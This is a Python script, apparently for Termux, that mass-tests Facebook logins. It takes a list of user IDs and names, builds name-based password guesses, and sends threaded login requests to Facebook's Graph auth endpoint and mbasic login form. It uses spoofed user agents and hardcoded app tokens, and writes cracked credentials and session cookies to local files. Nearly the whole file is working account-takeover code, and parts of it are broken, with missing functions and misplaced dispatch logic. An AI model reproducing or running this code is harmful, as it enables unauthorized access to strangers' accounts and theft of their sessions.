
import os,zlib
import platform
from plistlib import UID

from os import name, system as osRUB
from os import system as cmd
import os
from os import system as sm
	
try:
    import requests 
except ImportError:
    print('\n  installing Requests ...\n')
    os.system('pkg install espeak')
    os.system('termux-setup-storage -y')
    os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    print('\n  installing futures ...\n')
    os.system('pip install futures')

try:
    import mechanize
except ModuleNotFoundError:
    os.system('pip install mechanize > /dev/null')

from urllib.request import Request, urlopen
import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
from concurrent.futures import ThreadPoolExecutor as CENTSUCENT
from string import *
from rich import print as rp
from rich.panel import Panel as pan
from random import randint
from time import sleep as slp
from os import system as cmd
from zlib import decompress 
import os, platform

           
from concurrent.futures import ThreadPoolExecutor
fast_work = ThreadPoolExecutor(max_workers=15).submit
#----random model
modelRDM = requests.get('https://raw.githubusercontent.com/CenTsuPH/Serial/main/Mlaptops.txt').text.splitlines()
totaldmp = 0
count = 0
loop = 0
oks = []
cps = []
id = []
ps = []
sid = []
total=[]
methods = []
srange = 0
saved = []
totaldmp = 0
filter = []
ugen = []
ugen2 = []
ugen3 = []
ugenn = []
    
def cent4():
    locales = ["en_US", "fr_FR", "es_ES", "de_DE", "it_IT", "pt_BR", "zh_CN", "ja_JP"]
    FBAN123 = "FBAN/FB4A"
    FBAV = f"FBAV/{random.randint(10, 500)}.0.0.{random.randint(0, 999)}"
    FBBV = f"FBBV/{random.randint(1000000, 999999999)}"
    FBDM = f"FBDM/{{density={random.uniform(0.5, 4.0):.1f},width={random.choice([720, 1080, 1440, 1920])},height={random.choice([1280, 1920, 2560, 1080])}}}"
    FBLC = f"FBLC/{random.choice(locales)}"
    FBRV = f"FBRV/{random.randint(100000000, 999999999)}"
    FBCR = random.choice(["Robi"])
    FBMF = random.choice(["Windows"])
    FBBD = FBMF
    FBPN = "FBPN/com.facebook.katana"
    FBDV = random.choice(modelRDM)
    FBSV = f"FBSV/{random.randint(9, 14)}.0"
    FBOP = f"FBOP/{random.randint(10, 20)}"
    FBCA = random.choice(["arm64-v8a", "armeabi-v7a", "x86", "x86_64"])  
    user_agent = f"{FBAN123};{FBAV};{FBBV};{FBDM};{FBLC};{FBRV};{FBCR};{FBMF};{FBBD};{FBPN};{FBDV};{FBSV};{FBOP};{FBCA}"
    return user_agent

def iplocate():
    try:    	
        response = requests.get('https://ipinfo.io/json')
        data = response.json()
        return data
    except Exception as e:
        return {'error': str(e)}
    
#------------- color -----------#   
sys.stdout.write('\x1b]2; CENT\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
Z = '\033[1;33m'
H = '\x1b[1;97m'
l = '\033[97;1m'
P = '\x1b[1;92m'
b = '\33[1;96m'
#--------------api/token--------#
apikey1 = "882a8490361da98702bf97a021ddc14d"
apikey2 = "62f8ce9f74b12f84c123cc23437a4a32"
fbtoken1 = 'd29d67d37eca387482a8a5b740f84f62'
fbtoken2 = '62f8ce9f74b12f84c123cc23437a4a32'
#--------------api/token--------#

head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
logo =                                          """            
\033[97;1m           █████╗ ███████╗███╗  ██╗████████╗
\033[97;1m          ██╔══██╗██╔════╝████╗░██║╚══██╔══╝
\033[97;1m          ██║░░╚═╝█████╗░░██╔██╗██║░░░██║░░░
\033[97;1m          ██║░░██╗██╔══╝░░██║╚████║░░░██║░░░
\033[97;1m          ╚█████╔╝███████╗██║░╚███║░░░██║░░░
\033[97;1m          ░╚════╝░╚══════╝╚═╝░░╚══╝░░░╚═╝░░░                                                                         
     ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
     ║      \033[97;1m[ F U C K Y O U B Y P A S S E R ]     \033[97;1m ║
     ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[97;1m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[§] AUTHOR       :      cent
[§] TOOLS        :      FILE CLONE 
[§] TYPE         :      FREE
[§] FACEBOOK     :      cent
[§] VERSION.     :      PRIVATE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[97;1m"""
def approval():
  uuid = str(os.geteuid())+"DS"+str(os.geteuid())
  id = 'CENT-' +"".join(uuid)
  os.system('clear')
  print(logo) 
  print("\033[1;37m [\u001b[36m•\033[1;37m] You Need Approval To Use This Tool   \033[1;37m")
  print("\033[1;37m [\u001b[36m•\033[1;37m] Your Key :\033[0;32m "+id);time.sleep(0.1)
  print ("""\033[1;37m----------------------------------------------""")
  try:
    httpCaht = requests.get("https://github.com/CenTsuPH/centsu/blob/main/3users.txt.txt").text
    if id in httpCaht:
      print("\033[0;32m >> Your Key Has Been Approved !!!")
      msg = str(os.geteuid())
      time.sleep(1)
      pass
    else: 
      print("\x1b\033[0;32m >> Send Key on Facebook ! ");
      time.sleep(0.1)
      
      input(' >> Click Enter To Send Your Key ')
      
      os.system('xdg-open https://www.facebook.com/CenT.aep?mibextid=ZbWKwL')
      
      time.sleep(1)
      
      
      exit()
      
  except: 
  	
     print(" >> Unable To Fetch Data From Server ")
     
     time.sleep(2)
     
     exit()
approval()

def clear():
        os.system('clear')
        print(logo)    
    
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        print('\n')
        print(47*'-')
        print(' The Process has been Complete...')
        print(' TOTAL OK: %s' % str(len(oks)))
        print(' TOTAL CP: %s' % str(len(cps)))
        print(47*'-')
        input("Press enter to back CENT Menu ")
        CENTSU()
def fresh():os.system('clear');print(logo)
def CENTSU():   
    os.system('clear')
    print(logo)
    print(f'[1] File cloaning')
    print(f'[2] REPORT ISSUE')
    #print(f'[F] Join Facebook Group ')
    print('')
    select = input('Select Menu>: ')
    if select =='1':
        method_CENT()       
    elif select =='0':
        exit(' This is Option Soon available ... ')
    elif select =='2':
        os.system('xdg-open https://www.facebook.com/CenT.aep?mibextid=ZbWKwL')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        #CENT(allkey)
        
def method_CENT():
    global methods
    clear()
    print(f'[1] Method {1}')
    print(f'[2] Method {2}')
    print(f'[3] Method - mbasic {3}')
    print(f'[0] Back')
    print('')
    option = input('Select method>: ')
    if option =='1':
        methods.append('methodA')
        main_CENT().CENT(id)
    elif option =='2':
        methods.append('methodC')
        main_CENT().CENT(id)
    elif option =='3':
        methods.append('methodD')
        main_CENT().CENT(id)
    elif option =='4':
        main_CENT().CENT(id)
    elif option =='0':
        CENTSU()
    else:
      print('\n Select Valid Option ...')
      time.sleep(2)
      method_CENT()

class main_CENT():
    def __init__(self):
        self.id=[]
    def CENT(self,id):
        global methods
        clear()
        self.file = input('Put File Name : ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print('Opps File Not Found ...')
            time.sleep(2)
            os.system('clear')
            print(logo)
            print('Try Again ...')
            time.sleep(2)
            main_CENT().CENT(id)
                  
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}>>>>>[CENT]<<<<< | M1 OK ╬ CP {len(oks)}/{len(cps)} | {loop} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": sid,
"password": ps,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "62f8ce9f74b12f84c123cc23437a4a32"}
                headers = {'User-Agent': cent4(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);#CENTb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={CENTb};{ckkk}"
                    print(f"\r\r\033[97;1m=======================[CENT]======================")
                    print(f"╔━━━━\033[0;32m[OK]{sid} | {ps}{S}")
                    print(f"╚━━━━\033[0;34m[FBLINK]:https://www.facebook.com/"+sid)
                    print(f"\033[97;1m=======================[CENT]======================")
                    #os.system('espeak -a 300 " HEY, YOU, GOT,  FUCK, ID"')
                    oks.append(sid)
                    open('/sdcard/CENT_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/CENT_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+ckkk+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #print(f"\r{A} [CENT-CP] {sid} | {ps} {S}")
                    #os.system('espeak -a 300 " oh shit Cp ID"')
                    cps.append(sid)
                    open('/sdcard/CENT_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodA(sid, name, ps)
            
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[CENT] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": sid,
"password": ps,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': cent6(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);CENTb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={CENTb};{ckkk}"
                    print(f"\r\r\033[97;1m=======================[CENT]======================")
                    print(f"╔━━━━\033[0;32m[OK]{sid} | {ps}{S}")
                    print(f"╚━━━━━━━━━━━━━━━\033[0;34m[FBLINK]:https://www.facebook.com/"+sid)
                    print(f"\033[97;1m=======================[CENT]======================")
                    oks.append(sid)
                    open('/sdcard/CENT_OK_ids_M3.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/CENT_iDs_COOKiEs_M3.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #print(f"\r{A} [CENT-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/CENT_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodB(sid, name, ps)
    
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}>>>>>[CENT]<<<<< | M3 OK ╬ CP {len(oks)}/{len(cps)} | {loop} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        except:
            ls = fs
        try:
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                session=requests.Session()
                sua = random.choice(ugen)
                #sua = random.choice(cent6)
                getlog = session.get(f'https://m.facebook.com/login/device-based/password/?uid={sid}&flow=login_no_pin&refsrc=deprecated&_rdr')
                idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":sid,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":ps,}
                session.headers = {}
                session.headers.update({
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '2',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"itel A665L"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': sua,
    'viewport-width': '980',
    'x-chrome-offline': 'persist=0 reason=reload',
})
                complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False)
                if 'c_user' in session.cookies.get_dict():
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in session.cookies["session_cookies"])#CENTb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={CENTb};{ckkk}"
                    print(f"\r\r\033[97;1m=======================[CENT]======================")
                    print(f"\033[0;32m╔━━━━[OK]{sid} | {ps}{S}")
                    print(f"\033[0;34m╚━━━━━━━━━━━━━━━[FBLINK]:https://www.facebook.com/"+sid)
                    print(f"\033[97;1m=======================[CENT]======================")
                    oks.append(sid)
                    open('/sdcard/CENT_OK_ids_M3.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/CENT_iDs_COOKiEs_M3.txt','a').write(sid+'|'+ps+'|'+ckkk+'\n')
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    print(f"\r{A} [CENT-CP] {sid} | {ps} {S}")
                    os.system('espeak -a 300 " oh shit Cp ID"')
                    cps.append(sid)
                    open('/sdcard/CENT_CP.txt','a').write(sid+'|'+ps+'\n')
                    break
                else:
                    continue
                #time.sleep(31)
            
            loop+=1
        except requests.exceptions.ConnectionError:
             self.methodD(sid, name, ps)
        
    def pasw(self):       
            pw = []
            ip_details = iplocate()
            clear()
            print('Put limit between 1 to 30')
            sl = int(input('How many password do you want to add?: '))
            os.system("clear")
            print(logo)
            print(f'{S} [Example: first123,last1122,firstlast,last,ETC]')
            print('')
            if sl =='':
                print('\n Put limit between 1 to 30')
            elif sl > 100:
                print('\nPassword limit Should Not Be Greater Than 30')
            else:
                for sr in range(sl):
                    pw.append(input(f'Password {sr+1}: '))
            os.system("clear")
            print(logo)
            
            print(f"\r{A}Use flight (airplane) mode before use {S}")
            print(40*"-")
            print(f"{H}Country Code :{P} {b}", ip_details.get('country', 'N/A'))
            print(f"{H}Region       :{P} {b}", ip_details.get('region', 'N/A'))
            print(f"{H}City         :{P} {b}", ip_details.get('city', 'N/A'))
            print(40*"-")
            print(f'{l}Total IDs    :  %s ' % len(self.id))         
            print(f'{l}Starting Started...')
            print(40*"-")
            with CENTSUCENT(max_workers=30) as CENTworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                       else:
                            pwx =  pw
                            if 'methodA' in methods:
                                CENTworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                CENTworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                CENTworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                CENTworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)      
CENTSU()
